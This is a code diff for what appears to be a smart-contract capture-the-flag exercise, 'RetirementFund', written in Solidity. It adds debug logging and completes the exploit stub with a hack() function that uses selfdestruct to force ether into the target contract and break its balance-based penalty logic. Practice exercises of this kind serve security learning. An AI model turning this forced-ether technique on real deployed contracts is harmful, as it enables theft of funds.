@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+import "forge-std/console.sol";
 
 contract RetirementFund {
     uint256 startBalance;
@@ -42,6 +43,8 @@ contract RetirementFund {
             // an early withdrawal occurred
             require(withdrawn > 0);
         }
+        console.log("withdrawn", withdrawn);
+        console.log("current balance", address(this).balance);
 
         // penalty is what's left
         (bool ok, ) = msg.sender.call{value: address(this).balance}("");
@@ -57,5 +60,7 @@ contract ExploitContract {
         retirementFund = _retirementFund;
     }
 
-    // write your exploit functions below
+    function hack() external payable {
+        selfdestruct(payable(address(retirementFund)));
+    }
 }
